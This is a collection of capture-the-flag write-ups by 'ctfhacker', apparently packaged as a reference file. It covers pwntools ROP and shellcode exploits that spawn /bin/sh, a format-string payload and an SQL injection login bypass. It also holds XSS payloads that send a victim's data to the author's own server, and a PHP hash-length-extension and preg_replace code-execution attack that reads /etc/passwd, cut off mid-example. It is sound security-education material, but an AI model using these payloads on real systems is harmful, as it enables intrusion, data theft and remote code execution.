<!--
LICENSE UPL
Author: Mauro Risonho de Paula Assumpção
Data Create: 2026-03-16
Data Update: 2026-03-16
-->

---
name: writeup-ctfhacker
description: CTF writeups and security challenges by ctfhacker.
---

# Writeups by ctfhacker

Source repository: `/repos/ctfhacker`

## Repository Index

- ctf-writeups/README.md
- ctf-writeups/houseccon-2015-august/README.md
- ctf-writeups/pico-ctf-2014/README.md
- ctf-writeups/saintcon-pre-4/README.md
- ctf-writeups/vulnhub/brainpan3/README.md
- ctf-writeups/seccon-ctf-2014/lets-disassemble/README.md
- ctf-writeups/polictf-2015/johns-library/README.md
- ctf-writeups/polictf-2015/johns-shuffle/README.md
- ctf-writeups/mmactf-2015/moneygame/README.md
- ctf-writeups/flareon-2018/level5/README.md
- ctf-writeups/flareon-2018/level6/README.md
- ctf-writeups/defcon-openctf-2015/runic/README.md
- ctf-writeups/defcon-openctf-2015/sigil/README.md
- ctf-writeups/campctf-2015/bitterman-pwn-400/README.md

## Writeup Content


### File: ctf-writeups/README.md

# Quick writeups

#### Haxdump 2015 - pwnxy
Requests a page via a given GET request. The request results is placed directly into a printf, resulting in a string format vuln. From the vuln, overwrite the `exit` entry in the GOT with a static stack address to execute code from the GET request

#### P_KR
"My first overflow" style. Simply give `0xCAFEBABE` 14 times in order to overwrite the local variable

Client/Server problem to implement a binary search in order to find a random number in a range of numbers

Input a username and two passcodes in order to "login". Using the username field, overwrite the pointer to where the first passcode writes. Use the first passcode field to overwrite the `exit` entry in the GOT with the address of the `system('/bin/sh')` provided in the binary

Input a password, it is xor'ed with a key and if it matches the password from a file, you win. Logic error in setting a file descriptor while comparing the result. Missing parentheses allowed the attacker to control both the input password and the password used to check against.

Give a base64 encoded message, and get the md5 sum of the original message. Stack canaries are on. There is a "captcha" before sending your message that is calculated with the stack canary. Random is also seeded with time(), which we also know because we have access to the server itself. Knowing this, we can calculate the calculate the stack canary ourselves. The base64 decode function allows an overflow to happen. The decoded message contains the canary at the correct location, and then a ret2system was easy peasy.

Implementation of the brainfuck language. Use the pointer to leak the address of `puts` then overwrite `puts` with the address of a few instructions after `puts` in `main`. Send a second `bf` instruction with our rop payload of `system('/bin/sh')` from their libc. Overwrite `puts` a second time with a stack pivot to add to esp and reach our `system` call. `PROFIT!`



### File: ctf-writeups/campctf-2015/bitterman-pwn-400/README.md

# Bitterman

## Recon

Upon connecting, we are given a prompt which asks for the following items:
* Name
* Length of a message
* The message itself

As per normal, let's try the low hanging fruit of throwing lots of data at each field to see if we get a crash.

Turns out, if we say that we will send 1024 bytes and send 1024 bytes, we crash *shrug* (If there is time after the CTF, I'll go back and see what exactly caused the crash)

## Exploit

Because NX is turned on, we need to do some fancy ROP. Our ROP strategy is below:
* Leak a libc address via ROPing to `puts()` with `puts` as the parameter. 
    - This will return the address of `puts` in the libc the binary is using. 
    - We can calculate the libc base address since we were given their libc in the problem (leaked_libc_read_address - original_libc_from_challenge = base_libc_on_server)
* Call main so we can re-exploit with the knowledge of the libc base address.

This ROP construction is here:
```python
from pwn import *

elf = ELF('./bitterman')
rop = ROP(elf)

rop.puts(elf.got['puts'])
rop.call(elf.symbols['main'])

print rop.dump()
```

Leaking the address from this ROP chain and rebasing the libc address in pwntools is below:
```python
# Be sure to add the zeros that we miss due to string read
# Grab the first 8 bytes of our output buffer
leaked_puts = r.recv()[:8].strip().ljust(8, '\x00')

# Convert to integer
leaked_puts = struct.unpack('Q', leaked_puts)[0]

# Rebase libc to the leaked offset
libc.address = leaked_puts - libc.symbols['puts']
```

From here, we can create a second ROP which will simply call `system` with `/bin/sh`. Luckily, `/bin/sh` is in libc, so we simply find where that string is, and call `system` with it.

The second ROP construction is below:

```python
# Create new ROP object with rebased libc
rop2 = ROP(libc)

# Call system('/bin/sh')
rop2.system(next(libc.search('/bin/sh\x00')))

print rop2.dump()
```

Our shell is received and the flag is given:

```python
$ ls
bitterman
flag.txt
run.sh
$ cat flag.txt
CAMP15_a786be6aca70bfd19b6af86133991f80
```



### File: ctf-writeups/defcon-openctf-2015/runic/README.md

# Runic

Below is the main function for Runic:

![Runic main](runic.png)

The following events happen:
* read() of 0x40 bytes (64 bytes)
* call() to the buffer that was just read into

We can send a max of 64 bytes of shellcode, which is immediately executed.

The following script simply sends a `/bin/sh` shellcode, and a shell of ours.

```python
import sys
from pwn import * # pip install pwntools

context(arch='x86', os='linux')

HOST = '127.0.0.1'
PORT = 4444

## Example
# r = process('./runic')
r = remote(HOST, PORT)

# Debug process
'''
gdb.attach(r, """
bp 80484fa
c
""")
'''

shellcode = asm(shellcraft.sh())

r.sendline(shellcode)

r.interactive()
```



### File: ctf-writeups/defcon-openctf-2015/sigil/README.md

# Sigil

The main funciton of sigil is below:
![Sigil main](sigil.png)

The following occurs:
* memory region is set to `read-write-execute` permissions
* read() of length 16 into that memory region
* call to the buffer just read

The gameplan for this exploit is to send an initial payload which will call `read()` into the `RWX` memory region. From here, we send the actual `/bin/sh` payload which will continue executing after our stage 1 payload.

We can call `read` via `syscall` to make this shellcode small. The following must be setup for this to work:
* rax - 0
* rdi - file descriptor to read from, i.e. stdin
* rsi - destination buffer
* rdx - 0x30 : Arbitrary length to read

The `rax` register is already set to `0` for our `read` syscall, so no modification needs to happen there. The `rdi` register needs to be a `0` in order to read from stdin, so a simple `xor rdi, rdi` will accomplish this for us. The destination buffer is already stored in the rdx register when our shellcode is run, which means we only need to execute a `mov rsi, rdx` in order to setup our destination buffer location. Lastly, we need to set a read length, and a simple `mov rdx, 0x30` will work.

The final stage 1 shellcode is below:
```
mov rsi, rdx' # rdx already contains our buffer location
mov edx, 0x30' # set our read length
add rsi, 10' # adjust our buffer a bit further down, so we don't overwrite our initial shellcode
syscall # Execute read
```

From here, we send a second shellcode containing our generic `/bin/sh` shellcode in order to receive our shell.

The full exploit is below:

```python
from pwn import * # pip install pwntools
context(arch='amd64')

HOST = '127.0.0.1'
PORT = 4444

# r = process('./sigil')
r = remote(HOST, PORT)

# Debug helper
"""
gdb.attach(r, '''
bp 40062a
c
''')
"""

"""
read() syscall
rax - 0
rdi - file descriptor to read from - 0 => stdin
rsi - destination buffer
rdx - length to read
"""

"""
rax is already 0 for syscall read
rdi is already 0
'xor rdi, rdi', # Read from stdin (file descriptor 0)
"""
shellcode = asm('\n'.join([
'mov rsi, rdx', # rdx already contains our buffer location
'mov edx, 0x30',
'add rsi, 10',
'syscall'
]))

# Ensure we send a full 16 byte Stage 1 payload.
shellcode = shellcode.rjust(16, '\x90')
log.info("Shellcode:[{}]  {}".format(len(shellcode), shellcode))

# Create second payload - simple /bin/sh payload
# Add a beginning nop sled, because why not?
log.info("Stage2: {}".format(shellcraft.sh()))
sc = asm(shellcraft.sh())
sc = sc.rjust(0x30, '\x90')
log.info("Stage2: {}".format(sc))

r.sendline(shellcode + sc)

r.interactive()




### File: ctf-writeups/flareon-2018/level5/README.md

# FlareOn 2018 Level 5 Wasabi

Run a local file server:

```
python -m SimpleHTTPServer 6767
```

Throw a fake string to the server and watch the output come out in the console log

```
http://127.0.0.1:6767/?q=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

```
log-all.js:11 {func: 47, instr: 2099} "i32.eq" "first =" 119 " second =" 65 "result =" 0
log-all.js:12 w
log-all.js:11 {func: 47, instr: 2099} "i32.eq" "first =" 97 " second =" 65 "result =" 0
log-all.js:12 wa
log-all.js:11 {func: 47, instr: 2099} "i32.eq" "first =" 115 " second =" 65 "result =" 0
log-all.js:12 was
log-all.js:11 {func: 47, instr: 2099} "i32.eq" "first =" 109 " second =" 65 "result =" 0
log-all.js:12 wasm
log-all.js:11 {func: 47, instr: 2099} "i32.eq" "first =" 95 " second =" 65 "result =" 0
log-all.js:12 wasm_
log-all.js:11 {func: 47, instr: 2099} "i32.eq" "first =" 114 " second =" 65 "result =" 0
log-all.js:12 wasm_r
log-all.js:11 {func: 47, instr: 2099} "i32.eq" "first =" 117 " second =" 65 "result =" 0
log-all.js:12 wasm_ru
log-all.js:11 {func: 47, instr: 2099} "i32.eq" "first =" 108 " second =" 65 "result =" 0
log-all.js:12 wasm_rul
log-all.js:11 {func: 47, instr: 2099} "i32.eq" "first =" 101 " second =" 65 "result =" 0
log-all.js:12 wasm_rule
log-all.js:11 {func: 47, instr: 2099} "i32.eq" "first =" 122 " second =" 65 "result =" 0
log-all.js:12 wasm_rulez
log-all.js:11 {func: 47, instr: 2099} "i32.eq" "first =" 95 " second =" 65 "result =" 0
log-all.js:12 wasm_rulez_
log-all.js:11 {func: 47, instr: 2099} "i32.eq" "first =" 106 " second =" 65 "result =" 0
log-all.js:12 wasm_rulez_j
log-all.js:11 {func: 47, instr: 2099} "i32.eq" "first =" 115 " second =" 65 "result =" 0
log-all.js:12 wasm_rulez_js
log-all.js:11 {func: 47, instr: 2099} "i32.eq" "first =" 95 " second =" 65 "result =" 0
log-all.js:12 wasm_rulez_js_
log-all.js:11 {func: 47, instr: 2099} "i32.eq" "first =" 100 " second =" 65 "result =" 0
log-all.js:12 wasm_rulez_js_d
log-all.js:11 {func: 47, instr: 2099} "i32.eq" "first =" 114 " second =" 65 "result =" 0
log-all.js:12 wasm_rulez_js_dr
log-all.js:11 {func: 47, instr: 2099} "i32.eq" "first =" 111 " second =" 65 "result =" 0
log-all.js:12 wasm_rulez_js_dro
log-all.js:11 {func: 47, instr: 2099} "i32.eq" "first =" 111 " second =" 65 "result =" 0
log-all.js:12 wasm_rulez_js_droo
log-all.js:11 {func: 47, instr: 2099} "i32.eq" "first =" 108 " second =" 65 "result =" 0
log-all.js:12 wasm_rulez_js_drool
log-all.js:11 {func: 47, instr: 2099} "i32.eq" "first =" 122 " second =" 65 "result =" 0
log-all.js:12 wasm_rulez_js_droolz
log-all.js:11 {func: 47, instr: 2099} "i32.eq" "first =" 64 " second =" 65 "result =" 0
log-all.js:12 wasm_rulez_js_droolz@
log-all.js:11 {func: 47, instr: 2099} "i32.eq" "first =" 102 " second =" 65 "result =" 0
log-all.js:12 wasm_rulez_js_droolz@f
log-all.js:11 {func: 47, instr: 2099} "i32.eq" "first =" 108 " second =" 65 "result =" 0
log-all.js:12 wasm_rulez_js_droolz@fl
log-all.js:11 {func: 47, instr: 2099} "i32.eq" "first =" 97 " second =" 65 "result =" 0
log-all.js:12 wasm_rulez_js_droolz@fla
log-all.js:11 {func: 47, instr: 2099} "i32.eq" "first =" 114 " second =" 65 "result =" 0
log-all.js:12 wasm_rulez_js_droolz@flar
log-all.js:11 {func: 47, instr: 2099} "i32.eq" "first =" 101 " second =" 65 "result =" 0
log-all.js:12 wasm_rulez_js_droolz@flare
log-all.js:11 {func: 47, instr: 2099} "i32.eq" "first =" 45 " second =" 65 "result =" 0
log-all.js:12 wasm_rulez_js_droolz@flare-
log-all.js:11 {func: 47, instr: 2099} "i32.eq" "first =" 111 " second =" 65 "result =" 0
log-all.js:12 wasm_rulez_js_droolz@flare-o
log-all.js:11 {func: 47, instr: 2099} "i32.eq" "first =" 110 " second =" 65 "result =" 0
log-all.js:12 wasm_rulez_js_droolz@flare-on
log-all.js:11 {func: 47, instr: 2099} "i32.eq" "first =" 46 " second =" 65 "result =" 0
log-all.js:12 wasm_rulez_js_droolz@flare-on.
log-all.js:11 {func: 47, instr: 2099} "i32.eq" "first =" 99 " second =" 65 "result =" 0
log-all.js:12 wasm_rulez_js_droolz@flare-on.c
log-all.js:11 {func: 47, instr: 2099} "i32.eq" "first =" 111 " second =" 65 "result =" 0
log-all.js:12 wasm_rulez_js_droolz@flare-on.co
log-all.js:11 {func: 47, instr: 2099} "i32.eq" "first =" 109 " second =" 65 "result =" 0
log-all.js:12 wasm_rulez_js_droolz@flare-on.com
```



### File: ctf-writeups/flareon-2018/level6/README.md

## Writeup

[Full Writeup](http://ctfhacker.com/reverse/2018/09/16/flareon-2018-level6-angr.html)



### File: ctf-writeups/houseccon-2015-august/README.md

# August challenges for HouSecCon

```
* thebarbershopper has joined the channel

<malvin> welcome back our p0tat0heads legion. I have to say, great job on our first attack against Anextio. We have been processing the data we have extracted and come to a few conclusions:

1. Anextio is offering a service called CADRE. This is where things start to smell. I'm not sure how they can boast such a service, but we suspect that there is legitimacy behind their claims. Here is your challenge: find out the definition for CADRE acronym. Our social engineering efforts have been failing because there is an alternate definition that we haven't been able to find yet.

2. We extracted the following binary from their CADRE server. We believe there is valuable data that might give us more information on what hardware is behind CADRE. <./dial.exe> 

3. There is a hidden administrative login on the Anextio website. Get access, as our efforts have failed thus far. http://anextio.com/YWRtaW5pc3RyYXRpb25z/login

4. Once you get administrative access, we need to extract the IP address of the CADRE server. It appears to be redacted for our user, but maybe the others may have access. 

<Jim Sting> quit talking already Malvin! get hacking p0tat0heads!
```

## Captcha

Solve the captcha: `120117124101124117`

* Split the captcha is groups of 3
* Convert each set to a letter
* Offset the answer in order to pass to a substitution solver

EDIT: Turns out this is actually octal. Whodathunkit?! Oh well, the solution also works below ;-)

```python
>>> cap = '120117124101124117'
>>> for offset in xrange(20):
...     print ''.join([chr(int(cap[x:x+3])-offset) for x in xrange(0, len(cap), 3)])
...
xu|e|u
wt{d{t
vszczs
urybyr
tqxaxq <-- Looks good for rumkin to solve.
spw`wp
rov_vo
qnu^un
pmt]tm
ols\sl
nkr[rk
mjqZqj
lipYpi
khoXoh
jgnWng
ifmVmf
helUle
gdkTkd
fcjSjc
ebiRib
```

Pass one of our answers to rumkin and look at answers.

![Picture of solved substitution vipher](/houseccon-2015-august/pics/cap.png)

Due to the theme, try `POTATO` and register as user

## What is CADRE
```
1. Anextio is offering a service called CADRE. This is where things start to smell. I'm not sure how they can boast such a service, but we suspect that there is legitimacy behind their claims. Here is your challenge: find out the definition for CADRE acronym. Our social engineering efforts have been failing because there is an alternate definition that we haven't been able to find yet.
```

At first glance at the www.anextio.com website, CADRE stands for Cybersecurity Advanced Defense and Response Environment.
Upon trying this, no dice. Looking further down the page, the `A` could also mean `Adaptable`. Trying the following worked:

```
Cybersecurity Adaptable Defense and Response Environment.
```

## dial.exe
```
2. We extracted the following binary from their CADRE server. We believe there is valuable data that might give us more information on what hardware is behind CADRE. <./dial.exe> 
```

Yay! A binary! My kind of challenge:

```
PE32 executable for MS Windows (console) Intel 80386 Mono/.Net assembly
```

![Are you kidding me](http://images.sodahead.com/polls/004110707/235434734_Are_You_Kidding_Me_answer_11_xlarge.jpeg)

Oh well, it's .NET. We know that .NET can be decompiled to source using [dotPeek](https://www.jetbrains.com/decompiler/).

Looking at the source, it looks like we are given a fake terminal to attempt to wardial a given phone number. We are also given an area code and a set of prefixes. The source shows that if a certain `Dial` function succeeds, the terminal closes. We should be able to brute force this:

* Copy/pasta the source from dotPeek into our own script
* Write a few for loops to isolate the area code and prefix
* If we "successfully" decode the cipher string, append that solution to a file
* Check the output file to see if we can read anything

A sample for loop is below:

```
  public static void Main()
  {
    long i;
    string words;
    while (true)
    {
        for(i = 3117670000; i < 3117680000; i++){
            words = Dialer.Dial(i);
            if (string.IsNullOrEmpty(words))
            {
                Thread.Sleep(1);
            }
            else{
                string path = @"output-1.txt";
                using (StreamWriter sw = File.AppendText(path)) 
                {
                    sw.WriteLine(i);
                    sw.WriteLine(words);
                }    
            }
        }
    }
  }
```

Turns out, compiling this is easy in a Visual Studio shell.

```
csc dialer.cs
```

In order to quickly find if we have a good solution, a dumb check script was written to check if any more than half of a given line are letters.

```
import string
import glob
for filename in glob.glob('output*.txt'):
    data = open(filename, 'r').read().splitlines()

    for line in data:
        count = 0
        for c in line:
            if c in string.ascii_lowercase or c in string.ascii_uppercase:
                count = count + 1

        if count > (len(line)/2) and len(line) > 4:
            with open('winning', 'a') as f:
                f.write(line + '\n')
```

Several phone numbers output the following:

```
GREETINGS PROFESSOR FALKEN
```

I actually spent a good amount of time trying to find out the "hardware" of the machine. Turns out, the flag was the phone number all along.. Doh!

## Admin panel
```
3. There is a hidden administrative login on the Anextio website. Get access, as our efforts have failed thus far. http://anextio.com/YWRtaW5pc3RyYXRpb25z/login
```

Having a bit of fun on the admin panel shows that `'` actually returns a `500` error from the server, hinting at SQL Injection.
In trying a few things, `admin';--` returns a valid page. This tells us that we can successfully comment out the rest of the SQL query.

The next bit might seem like black magic, but it was the first thing I tried, and it worked.
Just as a common practice, I made sure to replace the spaces with a comment (as per a few other previous CTF challenges).
The `SELECT * FROM users` bit was a wild guess that happened to work. (shrug)

```
Username
admin'/**/UNION/**/SELECT/**/*/**/FROM/**/users;--
Password
aaaa
```

![Admin Panel](/houseccon-2015-august/pics/admin-panel.png)

## Get dat IP
```
4. Once you get administrative access, we need to extract the IP address of the CADRE server. It appears to be redacted for our user, but maybe the others may have access. 
```

This is where we get really annoyed. Our task was to discover the IP of the CADRE server that we have an interface to.

Seeing a message box and a few "Active" users, hints strongly towards Cross-Site Scripting. Testing a few generic XSS strings (`<script>alert('xss');</script>`) shows that the server is filtering a few things: `script`, `alert`, and `ip`. Our first task is to test that XSS is what we are looking for. Looking over previous XSS CTF challenges, I came across the following XSS string that successfully alerted for us:

```
<img/src="./"/onerror="&#0097;&#00108;&#00101;&#00114;&#00116;&#0040;&#0039;&#0088;&#0083;&#0083;&#0039;&#0041;">
```

![XSS 1](/houseccon-2015-august/pics/xss-1.png)


Our next task, is to test if our "Active" users are actually active. Sending a simple `<IMG>` tag to `ctaroot` trying to access an image on my AWS instance gives a successful request.

```
<IMG src="http://my.aws.instance/ctaroot.png"/>
```

```
# On AWS instance
$ python -m SimpleHTTPServer 80

65.128.52.100 - - [31/Aug/2015 19:15:13] "GET /ctaroot.png HTTP/1.1" 404 -
```

Awesome, so we do have "Active" users. As per typical XSS, let's try and steal the cookie for `ctaroot`. The idea being to submit an attacker generated form with the `ctaroot` cookie inside.

Below is the XSS payload:
```html
<img/src="./"onerror="BELOW JAVASCRIPT"/>
```

```javascript
// Create a new form and resubmit to 'send'
// the document.cookie of the current user
var/**/form/**/=/**/document.createElement('form');
form.setAttribute('method','post');
form.setAttribute('action','send');
var/**/hiddenField=document.createElement('input');
hiddenField.setAttribute('type','hidden');
hiddenField.setAttribute('name','to');
// 'value' is stripped by server
hiddenField.setAttribute(String.fromCharCode(118, 97, 108, 117, 101),'admin');
form.appendChild(hiddenField);
var/**/hiddenField=document.createElement('input');
hiddenField.setAttribute('type','hidden');
hiddenField.setAttribute('name','body');
// 'value' is stripped by server
// 'ip' is stripped by server
// hiddenField.setAttribute('value, document.cookie);
hiddenField.setAttribute(String.fromCharCode(118, 97, 108, 117, 101),document.getElementById(String.fromCharCode(105,112))[String.fromCharCode(118,97,108,117,101)]);

form.appendChild(hiddenField);
document.body.appendChild(form);
form.submit();
```

Sending this gives a gorgeous non-flag:

```
You are not authorized to view messages from CTARoot.
```

I must admit. I was a bit stumped for a minute, but one must move forward. I made a guess that the `ctaroot` interface would be the same as mine and that the DOM would also be similar.

The next idea would be to try and pull the IP from the `ctaroot` DOM and then ship that instead of the cookie. The last thing would be to send this to an AWS instance instead of to `send`. Ultimately, this worked!

```html
<img/src="./"onerror="BELOW JAVASCRIPT"/>
```

```javascript
// Create a new form with the IP from the DOM
// Submit the form to a known AWS instance
var/**/form/**/=/**/document.createElement('form');
form.setAttribute('method','get');
form.setAttribute('action','http://my.aws.instance/send');
var/**/hiddenField=document.createElement('input');
hiddenField.setAttribute('type','hidden');
hiddenField.setAttribute('name','to');
// 'value' is stripped by server
hiddenField.setAttribute(String.fromCharCode(118, 97, 108, 117, 101),'admin');
form.appendChild(hiddenField);
var/**/hiddenField=document.createElement('input');
hiddenField.setAttribute('type','hidden');
hiddenField.setAttribute('name','body');
// 'value' is stripped by server
hiddenField.setAttribute(String.fromCharCode(118, 97, 108, 117, 101),document.getElementById(String.fromCharCode(105,112))[String.fromCharCode(118,97,108,117,101)]);
// 'ip' is stripped by server
// 'value' is stripped by server

form.appendChild(hiddenField);
document.body.appendChild(form);
form.submit();
```

```
# On the AWS instance
python -m SimpleHTTPServer 80

# Time passes
65.128.52.100 - - [31/Aug/2015 20:40:24] "GET /send?to=admin&body=+10.201.40.147 HTTP/1.1" 404 -
``` 

Submitting this IP, finishes the August edition of HouSecCon CTF.

Here's to hoping for binary exploitation for the September edition ;-)



### File: ctf-writeups/mmactf-2015/moneygame/README.md

# Moneygame 1/2

## Recon

We are presented with a stock market game. We have to time the market just right in order to get 10x our initial cash pile. Psh.. easy peasy

Taking a look at the binary, we see that the numbers are generated from an `srand(time(0))`. This is great for us, since we can create the same random number sequence on our end, thus negating the "random" factor of the stocks.

![srand.png](srand.png)

## Quick aside

There is a print function that clears the screen in the binary. This was annoying to debug. Patching over it is a breeze with [binjitsu](http://www.github.com/binjitsu/binjitsu)

```python
from pwn import *

elf = ELF('moneygame')
# NOP out annoying print that clears screen
elf.asm(0x80487b3, 'nop')
elf.asm(0x80487b4, 'nop')
elf.asm(0x80487b5, 'nop')
elf.asm(0x80487b6, 'nop')
elf.asm(0x80487b7, 'nop')

elf.save('moneygame-patched')
```

Now, `moneygame-patched` can use used locally without the annoying screen clear. Now to the actual write-up

## Flag 1

With the help of Python's ctypes, generating these random numbers on our end is trivial:

```python
from ctypes import CDLL
libc = CDLL('libc-2.19.so')

# Seed srand with time(0)
now = int(floor(time.time()))
libc.srand(now)

random_num = libc.rand()
```

From here, we replicate the same function that creates the stocks from the binary in Python:

```python
def set_stocks():
    '''Create stocks based on current srand'''
    for index in xrange(1, 4):
        stocks[index].append(10000)

    for _ in xrange(54):
        for index in xrange(1, 4):
            curr_stock = stocks[index][-1]

            # Use of libc's rand in Python
            curr_stock += libc.rand() % 2001 - 1000
            if curr_stock <= 4999:
                curr_stock = 5000
            if curr_stock > 15000:
                curr_stock = 15000

            stocks[index].append(curr_stock)
```

Now that we have our three stock listings, we have to determine the optimal buy/sell path to success.

The quick and dirty method I used is described below:
* Calculate the peaks and valleys of each stock listings
* Calculate the largest profit margins for each stock using the peaks and valleys
* Sort all profit margins together
* Attempt to fill the 54 weeks based on the profit margins

An example of the last step of this simple algorithm is below:

The top three profit margins:
```
[4, 6, 100, '1'] Stock 1 from week 4 to 6 yields 100
[7, 9, 80,  '3'] Stock 3 from week 7 to 9 yields 80
[1, 5, 50,  '2'] Stock 2 from week 1 to 5 yields 100
```

Starting with the most profitable, fill in our available actions:
```
[4, 6, 100, '1'] Stock 1 from week 4 to 6 yields 100
Actions: ['', '', '', '', 'Buy stock1', 'Rest', 'Sell stock1', '', '', '']
```

Second most profitable:
```
[7, 9, 80,  '3'] Stock 3 from week 7 to 9 yields 80
Actions: ['', '', '', '', 'Buy stock1', 'Rest', 'Sell stock1', 'Buy stock3', 'Rest', 'Sell stock3']
```

Our third most profitable overlaps and existing range i.e. the [4, 6, 100, '1']. In this case, fill as much as we can before the start of the existing range.
Note: This is not optimal. Bigger improvements can be made, but are not necessary.
```
[1, 5, 50, '2']
# Note: 1 - 5 overlaps into existing 4 - 6, Try to go as far as we can before selling.
Actions: ['', 'Buy stock2', 'Rest', 'Sell stock2', 'Buy stock1', 'Rest', 'Sell stock1', 'Buy stock3', 'Rest', 'Sell stock3']
```

Now that we have our optimal actions, we simulate these actions in order to determine if the actions result in a bank of $100k. We don't want to waste time with the server, if we know ahead of time that we can lose.

Once we determine that we can win, we simply throw our results at the server and retrieve the first flag.

## Flag 2

There is a string format vulnerability in the name field of the high score after winning the game. After winning the game, the binary grabs the filename of the flag `flag1`, reads the contents of the file, and returns the contents to the user. We are given that the second flag is named `flag2`, so we can use the string format to simply change the filename from `flag1` to `flag2`. 

```
# Located at offset 7 on the stack
# 0x804a2b4 = 'flag1'
# 0x804a2b8 = '1'
# '2' == 50
# Padding necessary -> 50 - 4 bytes of address = 46
shellcode = p32(0x804a2b8) + '%46c%7$hhn'
```



### File: ctf-writeups/pico-ctf-2014/README.md

# Steve's List

What a fun challenge! We have a pwned website and we have to figure out how to pwn it as well.

Note:
If you want to follow along, be sure to have php 5.4 installed. [PHP 5.4 Installation](http://www.dev-metal.com/how-to-install-latest-php-5-4-x-on-ubuntu-12-04-lts-precise-pangolin/)

## Hash Length Extension
Looking at the `steves_list_backup.zip` we see the following files:
```
$ ls
cookies.php  includes  index.php  posts  root_data.php  Steve.png  templates
```

The first file to note is `cookies.php`:
```php
  2   if (isset($_COOKIE['custom_settings'])) {
        ...
 16     }
 17   } else {
 18     $custom_settings = array(0 => true);
 19     setcookie('custom_settings', urlencode(serialize(true)), time() + 86    400 * 30, "/");
 20     setcookie('custom_settings_hash', sha1(AUTH_SECRET . serialize(true)    ), time() + 86400 * 30, "/");
 21   }
```
Lines 19 and 20 show that if the cookie `custom_settings` isn't set aka if it is the user's first visit to the website, then two cookies are set: `custom_settings` and `custom_settings_hash`.

This can be verified in Google Chrome via the developer console (`Right Click -> Inspect Element -> 'Console'`)
```
> document.cookie
"custom_settings=b%253A1%253B; custom_settings_hash=2141b332222df459fd212440824a35e63d37ef69"
```
Let's try to run the code ourselves to see if our results match the cookie value
```php
$ cat php_1.php 
<?php
print serialize(true);
print urlencode(serialize(true));
?>

$ php php_1.php
b:1;
b%3A1%3B
```
*Quick note: `setcookie()` also does a urlencode, which is why we see a slightly different answer in our cookie. However, this is the correct value*

Line 5 of the same file is of key importance to us.
```php
  4     $custom_settings = urldecode($_COOKIE['custom_settings']);
  5     $hash = sha1(AUTH_SECRET . $custom_settings);
  6     if ($hash !== $_COOKIE['custom_settings_hash']) {
  7       die("Why would you hack Section Chief Steve's site? :(");
  8     }
```

Ah! So we are taking the cookie value in `custom_settings`, prepending the `AUTH_SECRET` and performing a sha1 hash. This screams to us, **LENGTH EXTENSION ATTACK**. For more details on this technique, [click here](http://en.wikipedia.org/wiki/Length_extension_attack).

Essentially, if we know the input data, the resulting hash, and the hash type, we can append malicious code to the initial data and receive a hash that will pass the given test. To do the hash calculation, we will utilize [hlextend](https://github.com/stephenbradshaw/hlextend).

To prove this, let's test hlextend.
```python
import hlextend
import requests
import subprocess

def php_urlencode(s):
    '''Return php urlencoded string'''
    print "ENCODE: " + s
    s = s.replace("\x00", "\0")
    encode_php = "<?php $text = <<<EOD\n{}\nEOD;\necho urlencode($text);\n?>".format(s)

    with open('encode_me.php', 'w') as f:
        f.write(encode_php)

    output = subprocess.check_output('php encode_me.php', shell=True)
    return output

url = 'http://steveslist.picoctf.com'
original_hash = '2141b332222df459fd212440824a35e63d37ef69'
original_data = 'b:1;'
appended_data = 'pwned'
key_length = 8

# Get our new hash for our new data
sha = hlextend.new('sha1')
cookie = sha.extend(appended_data, original_data, key_length, original_hash)
cookie_hash = sha.hexdigest()

# Send a request with our new cookie to verify our method works
output = php_urlencode(cookie)
cookies = {'custom_settings_hash': cookie_hash,
           'custom_settings': output}
print requests.get(url, cookies=cookies).text
```
In short, we appended "pwned" to the original data of "b:1;", ran the new data through `hlextend.py` to receive our new hash, then requested the web page with our new cookie.
```html
$ python hlextend_test.py
<html>
  <head>
    <title>Steve's List</title>
    <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css" />
    <link rel="stylesheet" href="steves_list.css" />
    <script src="javascript" src="http://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/js/bootstrap.min.js"></script>
  ...
  
  ...
<!-- POST 0wn3d by D43d4lu5 C0rp: OWNED OWNED OWNED OWNED OWNED OWNED SECTION CHIEF STEVE IS THE WORST<br><img src='./daedalus.png'><br><script>alert(1);</script><marquee>rekt</marquee><br><br><blink>we changed your secret</blink><br><br><marquee><blink>bet you'll never get control of this site back</blink></marquee><br><blink>look at this top quality tag we added</blink> --><!-- POST I'm Section Chief Steve: I'm the best.<br>The very best.<br><img src='./Steve.png'> -->
```
Because we see the HTML for the home page, we know that our cookie creation worked. Winning!

Now, what can we do with this new cookie creation?

## Unserialize object creation

Let's take a quick look at the `classes.php` file:
```php
...
  class Post {
    protected $title;
    protected $text;
    protected $filters;
    function __construct($title, $text, $filters) {
      $this->title = $title;
      $this->text = $text;
      $this->filters = $filters;
    }

    function get_title() {
      return htmlspecialchars($this->title);
    }

    function display_post() {
      $text = htmlspecialchars($this->text);
      foreach ($this->filters as $filter)
        $text = $filter->filter($text);
      return $text;
    }

    function __destruct() {
      // debugging stuff
      $s = "<!-- POST " . htmlspecialchars($this->title);
      $text = htmlspecialchars($this->text);
      foreach ($this->filters as $filter)
        $text = $filter->filter($text);
      $s = $s . ": " . $text;
      $s = $s . " -->";
      echo $s;
    }
  };
...
?>
```

We have a *Post* class that contains the `title` of a post, the `text` of a post, and `filters` on a post to essentially write markdown-style data without having to worry about html tags (or at least that was the intended purpose ;-)

There is a hint in the destructor of `// debugging stuff`. Typically, this means something interesting is approaching.

When called, the destructor calls each filter in the Post's `filters` on the `text` of the Post. Let's take a closer look at what the filter does in `classes.php`.
```php
<?php
  class Filter {
    protected $pattern;
    protected $repl;
    function __construct($pattern, $repl) {
      $this->pattern = $pattern;
      $this->repl = $repl;
    }
    function filter($data) {
      return preg_replace($this->pattern, $this->repl, $data);
    }
  };
```

Ah ha! Good ole `preg_replace`. This function replaces the match of the regex `pattern` in `data` with `repl`.
Here is the given example in the code:
```php
new Filter("/\[i\](.*)\[\/i\]/i", "<i>\\1</i>")
```
Applying this filter will do the following:

Before
```
[i] Words words words [/i]
```
After
```
<i> Words words words </i>
```

There is a fun feature with `preg_replace` that we can exploit here. In our regex `pattern` if we include the `e` flag, then the regex match will be replaced with the result of executable code aka a function, such as our old friends `file_get_contents` or `system`.

Let's make a filter that will utilize this "feature".

```php
$filter = [new Filter('/^(.*)/e', 'file_get_contents(\'/etc/passwd\')')];
```
This filter will replace everything in the `text` attribute of a Post with the contents of `/etc/passwd/`.

Now that we have a malicious filter, let's create a Post and test our hypothesis of calling a custom filter from the destructor.

```php
